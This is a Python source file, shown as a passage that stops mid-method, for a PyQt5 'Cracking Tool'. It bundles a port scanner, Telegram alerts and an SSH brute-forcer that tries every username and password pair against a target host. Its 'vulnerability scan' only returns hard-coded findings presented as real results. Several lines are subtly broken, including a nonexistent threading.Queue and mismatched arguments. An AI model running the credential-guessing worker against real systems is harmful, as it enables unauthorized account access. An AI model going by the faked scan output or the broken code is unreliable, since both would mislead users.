"""
----------------------------------------------------------------
A comprehensive security tool with SSH testing, network monitoring, 
Telegram bot integration, and advanced GUI features.

ONLY for authorized security testing on systems you own or have explicit permission to test.
"""

import sys
import paramiko
import socket
import time
import threading
import json
import os
import subprocess
import requests
import logging
import psutil
import platform
import re
import uuid
import hashlib
import base64
import tempfile
import webbrowser
from datetime import datetime, timedelta
from typing import List, Dict, Optional, Tuple, Any
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# PyQt5 imports
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QTextEdit, QProgressBar,
                             QFileDialog, QMessageBox, QGroupBox, QSpinBox, QTabWidget,
                             QListWidget, QSplitter, QToolBar, QAction, QStatusBar,
                             QInputDialog, QSystemTrayIcon, QMenu, QDialog, QCheckBox,
                             QComboBox, QTableWidget, QTableWidgetItem, QHeaderView,
                             QTreeWidget, QTreeWidgetItem, QProgressDialog, QSlider,
                             QFormLayout, QDoubleSpinBox, QRadioButton, QButtonGroup,
                             QScrollArea, QFrame, QSplitterHandle, QStyleFactory,
                             QStyle, QProxyStyle, QSizePolicy, QSpacerItem, QToolBox,
                             QStackedWidget, QListView, QDockWidget, QTextBrowser,
                             QMdiArea, QMdiSubWindow, QGraphicsView, QGraphicsScene,
                             QGraphicsItem, QGraphicsRectItem, QMenuBar, QDialogButtonBox)
from PyQt5.QtCore import (Qt, QThread, pyqtSignal, QTimer, QSettings, QSize, QPoint, 
                         QPropertyAnimation, QEasingCurve, QSequentialAnimationGroup,
                         QParallelAnimationGroup, QDate, QTime, QDateTime, QRectF,
                         QMimeData, QUrl, QEvent, QRegExp, QSortFilterProxyModel,
                         QStringListModel, QItemSelectionModel, pyqtProperty)
from PyQt5.QtGui import (QFont, QPalette, QColor, QIcon, QTextCursor, QPixmap, QImage,
                        QPainter, QPen, QBrush, QLinearGradient, QRadialGradient,
                        QConicalGradient, QFontDatabase, QKeySequence, QDesktopServices,
                        QTextCharFormat, QSyntaxHighlighter, QMouseEvent, QCursor,
                        QClipboard, QGuiApplication, QMovie, QStandardItemModel,
                        QStandardItem, QIconEngine, QRegion, QBitmap)

# Import additional security-related modules
try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BEAUTIFUL_SOUP_AVAILABLE = True
except ImportError:
    BEAUTIFUL_SOUP_AVAILABLE = False

# Constants
MAX_ATTEMPTS_PER_ACCOUNT = 3
DELAY_BETWEEN_ATTEMPTS = 5
MAX_THREADS = 10
CONFIG_FILE = "cyber_tool_config.json"
LOG_FILE = "cyber_tool.log"
TELEGRAM_COMMANDS_FILE = "telegram_commands.json"

# Enhanced logging setup
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('CybersecurityTool')

class ModernStyle(QProxyStyle):
    """Custom modern style for the application"""
    def __init__(self):
        super().__init__()
        self.animation_duration = 300
    
    def pixelMetric(self, metric, option=None, widget=None):
        if metric == QStyle.PM_SliderThickness:
            return 12
        elif metric == QStyle.PM_SliderLength:
            return 20
        elif metric == QStyle.PM_ScrollBarExtent:
            return 15
        elif metric == QStyle.PM_TabBarTabHSpace:
            return 30
        elif metric == QStyle.PM_TabBarTabVSpace:
            return 20
        return super().pixelMetric(metric, option, widget)
    
    def drawControl(self, element, option, painter, widget=None):
        if element == QStyle.CE_PushButton:
            self.drawModernButton(option, painter, widget)
        elif element == QStyle.CE_PushButtonBevel:
            pass  # We handle everything in drawModernButton
        else:
            super().drawControl(element, option, painter, widget)
    
    def drawModernButton(self, option, painter, widget):
        rect = option.rect
        painter.save()
        
        # Create gradient based on button state
        gradient = QLinearGradient(rect.topLeft(), rect.bottomLeft())
        
        if option.state & QStyle.State_MouseOver:
            if option.state & QStyle.State_Sunken:
                # Pressed state
                gradient.setColorAt(0, QColor(45, 85, 155))
                gradient.setColorAt(1, QColor(25, 65, 135))
            else:
                # Hover state
                gradient.setColorAt(0, QColor(65, 105, 225))
                gradient.setColorAt(1, QColor(45, 85, 205))
        else:
            # Normal state
            gradient.setColorAt(0, QColor(85, 125, 245))
            gradient.setColorAt(1, QColor(65, 105, 225))
        
        # Draw button background
        painter.setBrush(QBrush(gradient))
        painter.setPen(QPen(QColor(40, 40, 40), 2))
        painter.drawRoundedRect(rect.adjusted(1, 1, -1, -1), 8, 8)
        
        # Draw button text
        painter.setPen(QColor(255, 255, 255))
        painter.drawText(rect, Qt.AlignCenter, option.text)
        
        painter.restore()

class SyntaxHighlighter(QSyntaxHighlighter):
    """Syntax highlighter for command output and logs"""
    def __init__(self, parent=None):
        super().__init__(parent)
        
        self.highlighting_rules = []
        
        # Keyword patterns
        keyword_patterns = [
            r'\b(success|successful|connected|online|active)\b',
            r'\b(error|failed|failure|offline|inactive|timeout)\b',
            r'\b(warning|caution|alert|critical)\b',
            r'\b(INFO|DEBUG|WARNING|ERROR|CRITICAL)\b'
        ]
        
        keyword_format = QTextCharFormat()
        keyword_format.setForeground(QColor(76, 175, 80))  # Green
        keyword_format.setFontWeight(QFont.Bold)
        
        for pattern in keyword_patterns:
            self.highlighting_rules.append((QRegExp(pattern), keyword_format))
        
        # Error patterns
        error_format = QTextCharFormat()
        error_format.setForeground(QColor(244, 67, 54))  # Red
        error_format.setFontWeight(QFont.Bold)
        
        error_patterns = [
            r'\b(error|failed|failure|timeout|rejected|denied)\b',
            r'\b(exception|traceback|fatal|crash)\b'
        ]
        
        for pattern in error_patterns:
            self.highlighting_rules.append((QRegExp(pattern), error_format))
        
        # Warning patterns
        warning_format = QTextCharFormat()
        warning_format.setForeground(QColor(255, 152, 0))  # Orange
        warning_format.setFontWeight(QFont.Bold)
        
        warning_patterns = [
            r'\b(warning|alert|caution|attention)\b'
        ]
        
        for pattern in warning_patterns:
            self.highlighting_rules.append((QRegExp(pattern), warning_format))
        
        # IP address pattern
        ip_format = QTextCharFormat()
        ip_format.setForeground(QColor(33, 150, 243))  # Blue
        ip_pattern = QRegExp(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')
        self.highlighting_rules.append((ip_pattern, ip_format))
        
        # URL pattern
        url_format = QTextCharFormat()
        url_format.setForeground(QColor(156, 39, 176))  # Purple
        url_format.setFontUnderline(True)
        url_pattern = QRegExp(r'https?://[^\s]+')
        self.highlighting_rules.append((url_pattern, url_format))
    
    def highlightBlock(self, text):
        for pattern, format in self.highlighting_rules:
            expression = QRegExp(pattern)
            index = expression.indexIn(text)
            while index >= 0:
                length = expression.matchedLength()
                self.setFormat(index, length, format)
                index = expression.indexIn(text, index + length)
        
        self.setCurrentBlockState(0)

class CommandHistory:
    """Enhanced command history with search and persistence"""
    def __init__(self, max_size=500):
        self.history = []
        self.max_size = max_size
        self.current_index = -1
        self.search_results = []
        self.search_index = -1
        self.load_history()
    
    def add_command(self, command):
        if command.strip() and (not self.history or self.history[-1] != command):
            self.history.append(command)
            if len(self.history) > self.max_size:
                self.history.pop(0)
            self.current_index = len(self.history)
            self.save_history()
    
    def get_previous(self):
        if not self.history:
            return ""
        if self.current_index > 0:
            self.current_index -= 1
        return self.history[self.current_index] if self.current_index >= 0 else ""
    
    def get_next(self):
        if not self.history:
            return ""
        if self.current_index < len(self.history) - 1:
            self.current_index += 1
            return self.history[self.current_index]
        else:
            self.current_index = len(self.history)
            return ""
    
    def search(self, query):
        if not query:
            self.search_results = []
            self.search_index = -1
            return []
        
        self.search_results = [cmd for cmd in self.history if query.lower() in cmd.lower()]
        self.search_index = len(self.search_results) - 1 if self.search_results else -1
        return self.search_results
    
    def get_search_previous(self):
        if not self.search_results:
            return ""
        if self.search_index > 0:
            self.search_index -= 1
        return self.search_results[self.search_index] if self.search_index >= 0 else ""
    
    def get_search_next(self):
        if not self.search_results:
            return ""
        if self.search_index < len(self.search_results) - 1:
            self.search_index += 1
            return self.search_results[self.search_index]
        else:
            self.search_index = -1
            return ""
    
    def get_all(self):
        return self.history.copy()
    
    def clear(self):
        self.history.clear()
        self.current_index = -1
        self.save_history()
    
    def save_history(self):
        try:
            with open('command_history.json', 'w') as f:
                json.dump(self.history, f)
        except Exception as e:
            logger.error(f"Failed to save command history: {e}")
    
    def load_history(self):
        try:
            if os.path.exists('command_history.json'):
                with open('command_history.json', 'r') as f:
                    loaded_history = json.load(f)
                    self.history = loaded_history[-self.max_size:]
                    self.current_index = len(self.history)
        except Exception as e:
            logger.error(f"Failed to load command history: {e}")

class TelegramBotManager:
    """Enhanced Telegram bot manager with command processing"""
    def __init__(self):
        self.token = None
        self.chat_id = None
        self.base_url = "https://api.telegram.org/bot"
        self.last_update_id = 0
        self.polling_thread = None
        self.polling_active = False
        self.command_handlers = {}
        self.authorized_users = set()
        self.load_commands()
    
    def configure(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        return self.test_connection()
    
    def test_connection(self):
        if not self.token or not self.chat_id:
            return False, "Token or Chat ID not configured"
        
        try:
            url = f"{self.base_url}{self.token}/getMe"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                return True, "Connection successful"
            else:
                return False, f"API error: {response.status_code}"
        except Exception as e:
            return False, f"Connection failed: {str(e)}"
    
    def send_message(self, message, parse_mode='HTML'):
        if not self.token or not self.chat_id:
            return False, "Telegram not configured"
        
        try:
            url = f"{self.base_url}{self.token}/sendMessage"
            payload = {
                'chat_id': self.chat_id,
                'text': message,
                'parse_mode': parse_mode
            }
            response = requests.post(url, json=payload, timeout=10)
            return response.status_code == 200, f"Status: {response.status_code}"
        except Exception as e:
            return False, f"Send failed: {str(e)}"
    
    def start_polling(self, update_handler):
        """Start polling for Telegram updates"""
        if not self.token:
            return False, "Token not configured"
        
        self.polling_active = True
        self.polling_thread = threading.Thread(
            target=self._poll_updates,
            args=(update_handler,),
            daemon=True
        )
        self.polling_thread.start()
        return True, "Polling started"
    
    def stop_polling(self):
        """Stop polling for updates"""
        self.polling_active = False
        if self.polling_thread:
            self.polling_thread.join(timeout=5)
        return True, "Polling stopped"
    
    def _poll_updates(self, update_handler):
        """Poll Telegram for updates"""
        while self.polling_active:
            try:
                url = f"{self.base_url}{self.token}/getUpdates"
                params = {
                    'offset': self.last_update_id + 1,
                    'timeout': 30
                }
                response = requests.get(url, params=params, timeout=35)
                
                if response.status_code == 200:
                    data = response.json()
                    if data.get('ok'):
                        for update in data.get('result', []):
                            self.last_update_id = update['update_id']
                            update_handler(update)
                
                time.sleep(1)
            except Exception as e:
                logger.error(f"Telegram polling error: {e}")
                time.sleep(5)
    
    def register_command(self, command, handler, description=""):
        """Register a command handler"""
        self.command_handlers[command] = {
            'handler': handler,
            'description': description
        }
    
    def process_command(self, message_text, chat_id):
        """Process incoming command"""
        if not message_text.startswith('/'):
            return None
        
        parts = message_text[1:].split(' ', 1)
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""
        
        if command in self.command_handlers:
            return self.command_handlers[command]['handler'](args, chat_id)
        else:
            return f"Unknown command: {command}"
    
    def get_help_text(self):
        """Generate help text for registered commands"""
        help_lines = ["Available commands:"]
        for cmd, info in self.command_handlers.items():
            help_lines.append(f"/{cmd} - {info['description']}")
        return "\n".join(help_lines)
    
    def load_commands(self):
        """Load command definitions from file"""
        try:
            if os.path.exists(TELEGRAM_COMMANDS_FILE):
                with open(TELEGRAM_COMMANDS_FILE, 'r') as f:
                    commands_data = json.load(f)
                    self.command_handlers.update(commands_data)
        except Exception as e:
            logger.error(f"Failed to load commands: {e}")
    
    def save_commands(self):
        """Save command definitions to file"""
        try:
            with open(TELEGRAM_COMMANDS_FILE, 'w') as f:
                json.dump(self.command_handlers, f, indent=2)
        except Exception as e:
            logger.error(f"Failed to save commands: {e}")

class NetworkMonitor:
    """Enhanced network monitor with multiple monitoring types"""
    def __init__(self):
        self.monitoring = False
        self.monitored_hosts = {}  # ip -> {type, interval, last_status, alerts}
        self.telegram_bot = None
        self.monitoring_thread = None
        self.monitoring_active = False
    
    def start_monitoring(self, ip, monitor_type="ping", interval=30, telegram_bot=None):
        if ip in self.monitored_hosts:
            return False, f"Already monitoring {ip}"
        
        self.monitored_hosts[ip] = {
            'type': monitor_type,
            'interval': interval,
            'last_status': None,
            'alerts_enabled': True,
            'last_check': None,
            'status_changes': 0
        }
        
        self.telegram_bot = telegram_bot
        
        if not self.monitoring_active:
            self.start_monitoring_thread()
        
        return True, f"Started {monitor_type} monitoring for {ip} (interval: {interval}s)"
    
    def stop_monitoring(self, ip=None):
        if ip:
            if ip in self.monitored_hosts:
                del self.monitored_hosts[ip]
                return True, f"Stopped monitoring {ip}"
            else:
                return False, f"Not monitoring {ip}"
        else:
            self.monitored_hosts.clear()
            self.stop_monitoring_thread()
            return True, "Stopped all monitoring"
    
    def start_monitoring_thread(self):
        """Start background monitoring thread"""
        self.monitoring_active = True
        self.monitoring_thread = threading.Thread(target=self._monitoring_loop, daemon=True)
        self.monitoring_thread.start()
    
    def stop_monitoring_thread(self):
        """Stop background monitoring"""
        self.monitoring_active = False
        if self.monitoring_thread:
            self.monitoring_thread.join(timeout=5)
    
    def _monitoring_loop(self):
        """Main monitoring loop"""
        while self.monitoring_active and self.monitored_hosts:
            for ip, config in list(self.monitored_hosts.items()):
                if not self.monitoring_active:
                    break
                
                current_time = time.time()
                last_check = config.get('last_check', 0)
                
                if current_time - last_check >= config['interval']:
                    status = self.check_host(ip, config['type'])
                    config['last_check'] = current_time
                    
                    # Check for status change
                    if config['last_status'] is not None and config['last_status'] != status:
                        config['status_changes'] += 1
                        
                        if config['alerts_enabled'] and self.telegram_bot:
                            message = f"🔔 Host {ip} status changed: {config['last_status']} → {status}"
                            self.telegram_bot.send_message(message)
                    
                    config['last_status'] = status
            
            time.sleep(5)  # Short sleep between cycles
    
    def check_host(self, ip, check_type="ping"):
        """Check host status using specified method"""
        try:
            if check_type == "ping":
                return self._ping_check(ip)
            elif check_type == "tcp":
                return self._tcp_check(ip, 80)  # Default to HTTP port
            elif check_type == "http":
                return self._http_check(ip)
            else:
                return "unknown"
        except Exception as e:
            logger.error(f"Host check failed for {ip}: {e}")
            return "error"
    
    def _ping_check(self, ip):
        """Ping-based host check"""
        try:
            if os.name == 'nt':  # Windows
                param = '-n'
            else:  # Unix/Linux
                param = '-c'
            
            result = subprocess.run(
                ['ping', param, '1', ip],
                capture_output=True,
                text=True,
                timeout=10
            )
            return "online" if result.returncode == 0 else "offline"
        except:
            return "offline"
    
    def _tcp_check(self, ip, port):
        """TCP port check"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(5)
                result = sock.connect_ex((ip, port))
                return "online" if result == 0 else "offline"
        except:
            return "offline"
    
    def _http_check(self, ip):
        """HTTP-based check"""
        try:
            response = requests.get(f"http://{ip}", timeout=10)
            return "online" if response.status_code < 500 else "offline"
        except:
            return "offline"
    
    def get_status_report(self):
        """Generate comprehensive status report"""
        report = ["Network Monitoring Status Report"]
        report.append(f"Active monitors: {len(self.monitored_hosts)}")
        report.append("")
        
        for ip, config in self.monitored_hosts.items():
            status = config.get('last_status', 'unknown')
            last_check = config.get('last_check')
            last_check_str = "Never" if not last_check else datetime.fromtimestamp(last_check).strftime('%H:%M:%S')
            
            report.append(f"IP: {ip}")
            report.append(f"  Type: {config['type']}")
            report.append(f"  Status: {status}")
            report.append(f"  Last check: {last_check_str}")
            report.append(f"  Status changes: {config.get('status_changes', 0)}")
            report.append("")
        
        return "\n".join(report)

class SecurityScanner:
    """Comprehensive security scanner with multiple scan types"""
    def __init__(self):
        self.scan_results = {}
        self.current_scans = {}
    
    def port_scan(self, target, ports="1-1000", timeout=1, max_threads=50):
        """Perform TCP port scan"""
        scan_id = str(uuid.uuid4())
        self.current_scans[scan_id] = {
            'type': 'port_scan',
            'target': target,
            'status': 'running',
            'start_time': datetime.now(),
            'results': []
        }
        
        def scan_worker(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        service = self.get_service_name(port)
                        self.current_scans[scan_id]['results'].append({
                            'port': port,
                            'state': 'open',
                            'service': service
                        })
            except Exception as e:
                logger.error(f"Port scan error for port {port}: {e}")
        
        # Parse port range
        port_list = self.parse_port_range(ports)
        
        # Start scanning threads
        threads = []
        for port in port_list:
            if len(threads) >= max_threads:
                for t in threads:
                    t.join()
                threads = []
            
            t = threading.Thread(target=scan_worker, args=(port,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        self.current_scans[scan_id]['status'] = 'completed'
        self.current_scans[scan_id]['end_time'] = datetime.now()
        
        return scan_id
    
    def parse_port_range(self, port_range):
        """Parse port range string into list of ports"""
        ports = []
        ranges = port_range.split(',')
        
        for r in ranges:
            if '-' in r:
                start, end = map(int, r.split('-'))
                ports.extend(range(start, end + 1))
            else:
                ports.append(int(r))
        
        return ports
    
    def get_service_name(self, port):
        """Get common service name for port"""
        common_services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 993: "IMAPS",
            995: "POP3S", 3389: "RDP", 5900: "VNC"
        }
        return common_services.get(port, "Unknown")
    
    def vulnerability_scan(self, target):
        """Basic vulnerability assessment"""
        # This is a simplified example - real vulnerability scanning is complex
        scan_id = str(uuid.uuid4())
        self.current_scans[scan_id] = {
            'type': 'vulnerability_scan',
            'target': target,
            'status': 'running',
            'start_time': datetime.now(),
            'vulnerabilities': []
        }
        
        # Simulate scanning process
        time.sleep(2)
        
        # Add some example findings
        self.current_scans[scan_id]['vulnerabilities'] = [
            {
                'severity': 'Medium',
                'description': 'Weak SSH configuration detected',
                'recommendation': 'Harden SSH configuration'
            },
            {
                'severity': 'Low', 
                'description': 'Information disclosure in HTTP headers',
                'recommendation': 'Remove sensitive headers'
            }
        ]
        
        self.current_scans[scan_id]['status'] = 'completed'
        self.current_scans[scan_id]['end_time'] = datetime.now()
        
        return scan_id

class SystemInfo:
    """System information and resource monitoring"""
    @staticmethod
    def get_system_info():
        info = {
            'platform': platform.platform(),
            'processor': platform.processor(),
            'architecture': platform.architecture()[0],
            'hostname': platform.node(),
            'python_version': platform.python_version()
        }
        return info
    
    @staticmethod
    def get_resource_usage():
        resources = {
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory_percent': psutil.virtual_memory().percent,
            'disk_usage': psutil.disk_usage('/').percent,
            'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        }
        return resources
    
    @staticmethod
    def get_network_info():
        net_info = {}
        for interface, addrs in psutil.net_if_addrs().items():
            net_info[interface] = []
            for addr in addrs:
                net_info[interface].append({
                    'family': str(addr.family),
                    'address': addr.address,
                    'netmask': addr.netmask,
                    'broadcast': addr.broadcast
                })
        return net_info

class SSHTestResult:
    SUCCESS = "SUCCESS"
    FAILURE = "FAILURE"
    ERROR = "ERROR"

class SSHWorkerThread(QThread):
    update_signal = pyqtSignal(str, str, str)
    progress_signal = pyqtSignal(int)
    completed_signal = pyqtSignal(int, int, int)
    status_signal = pyqtSignal(str)

    def __init__(self, target_ip, target_port, username_list, password_list, max_threads):
        super().__init__()
        self.target_ip = target_ip
        self.target_port = target_port
        self.username_list = username_list
        self.password_list = password_list
        self.max_threads = min(max_threads, MAX_THREADS)
        self.stop_event = threading.Event()
        self.cred_queue = threading.Queue()
        self.lock = threading.Lock()
        self.completed = 0
        self.successful = 0
        self.failed = 0
        self.errors = 0
        self.total = 0

    def run(self):
        # Fill the credential queue
        for username in self.username_list:
            for password in self.password_list:
                self.cred_queue.put((username, password))

        self.total = self.cred_queue.qsize()
        self.status_signal.emit(f"Testing {self.total} credential combinations...")

        # Worker function for threads
        def worker():
            while not self.cred_queue.empty() and not self.stop_event.is_set():
                try:
                    username, password = self.cred_queue.get_nowait()
                    result = self.test_credentials(username, password)
                    
                    with self.lock:
                        if result == SSHTestResult.SUCCESS:
                            self.successful += 1
                            self.update_signal.emit(username, password, "SUCCESS")
                        elif result == SSHTestResult.FAILURE:
                            self.failed += 1
                            self.update_signal.emit(username, password, "FAILURE")
                        else:
                            self.errors += 1
                            self.update_signal.emit(username, password, "ERROR")
                        
                        self.completed += 1
                        progress = int((self.completed / self.total) * 100)
                        self.progress_signal.emit(progress)
                        self.cred_queue.task_done()
                        
                        # Rate limiting
                        time.sleep(DELAY_BETWEEN_ATTEMPTS)
                        
                except Exception as e:
                    break

        # Create and start threads
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)

        # Wait for threads to complete
        for t in threads:
            t.join()

        self.completed_signal.emit(self.successful, self.failed, self.errors)

    def test_credentials(self, username: str, password: str) -> str:
        if self.stop_event.is_set():
            return SSHTestResult.ERROR

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                self.target_ip,
                port=self.target_port,
                username=username,
                password=password,
                timeout=10,
                banner_timeout=10
            )
            client.close()
            return SSHTestResult.SUCCESS
        except paramiko.AuthenticationException:
            return SSHTestResult.FAILURE
        except (paramiko.SSHException, socket.error):
            return SSHTestResult.ERROR
        finally:
            try:
                client.close()
            except:
                pass

    def stop(self):
        self.stop_event.set()

class CommandProcessor:
    """Enhanced command processor with Telegram integration"""
    def __init__(self, network_monitor, telegram_bot, ssh_tester, security_scanner):
        self.network_monitor = network_monitor
        self.telegram_bot = telegram_bot
        self.ssh_tester = ssh_tester
        self.security_scanner = security_scanner
        self.commands = {
            'help': self.show_help,
            'ping': self.ping_ip,
            'start monitoring': self.start_monitoring,
            'stop': self.stop_monitoring,
            'config telegram token': self.config_telegram_token,
            'config telegram chat_id': self.config_telegram_chat_id,
            'clear': self.clear_screen,
            'history': self.show_history,
            'test telegram': self.test_telegram,
            'status': self.show_status,
            'scan ports': self.scan_ports,
            'system info': self.get_system_info,
            'resource usage': self.get_resource_usage,
            'vulnerability scan': self.vulnerability_scan
        }
    
    def process_command(self, command, output_callback=None, telegram_chat_id=None):
        cmd_parts = command.strip().lower().split()
        if not cmd_parts:
            return "No command entered"
        
        main_cmd = cmd_parts[0]
        
        # Handle multi-word commands
        if len(cmd_parts) >= 2:
            two_word_cmd = f"{main_cmd} {cmd_parts[1]}"
            if two_word_cmd in self.commands:
                return self.commands[two_word_cmd](cmd_parts[2:], output_callback, telegram_chat_id)
        
        if main_cmd in self.commands:
            return self.commands[main_cmd](cmd_parts[1:], output_callback, telegram_chat_id)
        else:
            return f"Unknown command: {command}\nType 'help' for available commands."
    
    def show_help(self, args, output_callback, telegram_chat_id):
        help_text = """
🤖 Advanced Cybersecurity Tool - Available Commands:

🔍 Monitoring & Scanning:
  ping <ip> - Ping an IP address
  start monitoring <ip> - Start monitoring an IP
  stop [ip] - Stop monitoring specific IP or all
  scan ports <ip> [ports] - Port scan (default: 1-1000)
  vulnerability scan <ip> - Basic vulnerability assessment

📊 System Information:
  system info - Show system information
  resource usage - Show CPU, memory, disk usage
  status - Show current monitoring status

🤖 Telegram Integration:
  config telegram token <token> - Set Telegram bot token
  config telegram chat_id <id> - Set Telegram chat ID
  test telegram - Test Telegram connection

🛠️ Utility:
  clear - Clear the screen
  history - Show command history
  help - Show this help message

💻 SSH Testing (GUI):
  Use the GUI tabs for SSH credential testing
"""
        return help_text
    
    def ping_ip(self, args, output_callback, telegram_chat_id):
        if not args:
            return "Usage: ping <ip_address>"
        
        ip = args[0]
        monitor = NetworkMonitor()
        is_alive = monitor.check_host(ip)
        status = "alive" if is_alive else "unreachable"
        return f"Ping result for {ip}: {status}"
    
    def start_monitoring(self, args, output_callback, telegram_chat_id):
        if not args:
            return "Usage: start monitoring <ip_address>"
        
        ip = args[0]
        success, message = self.network_monitor.start_monitoring(ip, self.telegram_bot)
        return message
    
    def stop_monitoring(self, args, output_callback, telegram_chat_id):
        ip = args[0] if args else None
        success, message = self.network_monitor.stop_monitoring(ip)
        return message
    
    def config_telegram_token(self, args, output_callback, telegram_chat_id):
        if not args:
            return "Usage: config telegram token <your_bot_token>"
        
        token = args[0]
        if self.telegram_bot.chat_id:
            success, message = self.telegram_bot.configure(token, self.telegram_bot.chat_id)
        else:
            self.telegram_bot.token = token
            success, message = True, "Token set (configure chat_id to complete setup)"
        
        return message
    
    def config_telegram_chat_id(self, args, output_callback, telegram_chat_id):
        if not args:
            return "Usage: config telegram chat_id <your_chat_id>"
        
        chat_id = args[0]
        if self.telegram_bot.token:
            success, message = self.telegram_bot.configure(self.telegram_bot.token, chat_id)
        else:
            self.telegram_bot.chat_id = chat_id
            success, message = True, "Chat ID set (configure token to complete setup)"
        
        return message
    
    def test_telegram(self, args, output_callback, telegram_chat_id):
        if not self.telegram_bot.token or not self.telegram_bot.chat_id:
            return "Telegram not fully configured. Set both token and chat_id."
        
        success, message = self.telegram_bot.send_message("🔒 Accurate Cyber Defense Next Gen Cracking Tool\nThis is a test of your Telegram integration.")
        return f"Telegram test: {message}"
    
    def clear_screen(self, args, output_callback, telegram_chat_id):
        if output_callback:
            output_callback("clear")
        return "Screen cleared"
    
    def show_history(self, args, output_callback, telegram_chat_id):
        return "show_history"
    
    def show_status(self, args, output_callback, telegram_chat_id):
        status_lines = ["📊 Current Status:"]
        status_lines.append(f"Monitoring: {len(self.network_monitor.monitored_hosts)} IPs")
        
        for ip, config in self.network_monitor.monitored_hosts.items():
            status = config.get('last_status', 'unknown')
            status_lines.append(f"  {ip}: {status} ({config['type']})")
        
        status_lines.append(f"Telegram: {'✅ Configured' if self.telegram_bot.token and self.telegram_bot.chat_id else '❌ Not configured'}")
        
        # Add system resource info
        resources = SystemInfo.get_resource_usage()
        status_lines.append(f"CPU: {resources['cpu_percent']}%")
        status_lines.append(f"Memory: {resources['memory_percent']}%")
        status_lines.append(f"Disk: {resources['disk_usage']}%")
        
        return "\n".join(status_lines)
    
    def scan_ports(self, args, output_callback, telegram_chat_id):
        if not args:
            return "Usage: scan ports <ip> [port_range]"
        
        ip = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        
        if output_callback:
            output_callback(f"Starting port scan on {ip} (ports: {ports})...")
        
        scan_id = self.security_scanner.port_scan(ip, ports)
        results = self.security_scanner.current_scans[scan_id]['results']
        
        if not results:
            return "No open ports found."
        
        result_lines = [f"Port scan results for {ip}:"]
        for result in results:
            result_lines.append(f"  Port {result['port']}: {result['state']} ({result['service']})")
        
        return "\n".join(result_lines)
    
    def get_system_info(self, args, output_callback, telegram_chat_id):
        info = SystemInfo.get_system_info()
        info_lines = ["💻 System Information:"]
        for key, value in info.items():
            info_lines.append(f"  {key}: {value}")
        return "\n".join(info_lines)
    
    def get_resource_usage(self, args, output_callback, telegram_chat_id):
        resources = SystemInfo.get_resource_usage()
        resource_lines = ["📈 Resource Usage:"]
        resource_lines.append(f"  CPU: {resources['cpu_percent']}%")
        resource_lines.append(f"  Memory: {resources['memory_percent']}%")
        resource_lines.append(f"  Disk: {resources['disk_usage']}%")
        resource_lines.append(f"  Boot Time: {resources['boot_time']}")
        return "\n".join(resource_lines)
    
    def vulnerability_scan(self, args, output_callback, telegram_chat_id):
        if not args:
            return "Usage: vulnerability scan <ip>"
        
        ip = args[0]
        scan_id = self.security_scanner.vulnerability_scan(ip)
        vulnerabilities = self.security_scanner.current_scans[scan_id]['vulnerabilities']
        
        if not vulnerabilities:
            return "No vulnerabilities found (or scan not implemented)"
        
        result_lines = [f"Vulnerability scan results for {ip}:"]
        for vuln in vulnerabilities:
            result_lines.append(f"  [{vuln['severity']}] {vuln['description']}")
            result_lines.append(f"     Recommendation: {vuln['recommendation']}")
        
        return "\n".join(result_lines)

class AnimatedButton(QPushButton):
    """Animated button with hover effects"""
    def __init__(self, text="", parent=None):
        super().__init__(text, parent)
        self._animation = QPropertyAnimation(self, b"color")
        self._animation.setDuration(300)
        self.default_color = QColor(85, 125, 245)
        self.hover_color = QColor(65, 105, 225)
        self.setMouseTracking(True)
    
    def enterEvent(self, event):
        self._animation.setStartValue(self.default_color)
        self._animation.setEndValue(self.hover_color)
        self._animation.start()
        super().enterEvent(event)
    
    def leaveEvent(self, event):
        self._animation.setStartValue(self.hover_color)
        self._animation.setEndValue(self.default_color)
        self._animation.start()
        super().leaveEvent(event)
    
    def get_color(self):
        return self.default_color
    
    def set_color(self, color):
        self.default_color = color
        self.update()
    
    color = pyqtProperty(QColor, get_color, set_color)

class CyberSecurityTool(QMainWindow):
    """Main application window with enhanced features"""
    def __init__(self):
        super().__init__()
        self.telegram_bot = TelegramBotManager()
        self.network_monitor = NetworkMonitor()
        self.security_scanner = SecurityScanner()
        self.command_processor = CommandProcessor(
            self.network_monitor, self.telegram_bot, None, self.security_scanner
        )
        self.command_history = CommandHistory()
        self.ssh_worker = None
        self.monitoring_timer = QTimer()
        self.telegram_update_timer = QTimer()
        self.system_monitor_timer = QTimer()
        
        # Initialize UI components
        self.init_ui()
        self.load_config()
        self.setup_telegram_commands()
        
        # Setup timers
        self.setup_timers()
        
        # Apply modern theme
        self.apply_modern_theme()
        
        logger.info("Cybersecurity Tool initialized successfully")
    
    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle("🔒 Accurate Cyber Defense Next Gen Cracking Tool")
        self.setGeometry(100, 100, 1400, 900)
        self.setMinimumSize(1200, 800)
        
        # Create menu bar
        self.create_menu_bar()
        
        # Create toolbar
        self.create_toolbar()
        
        # Create status bar
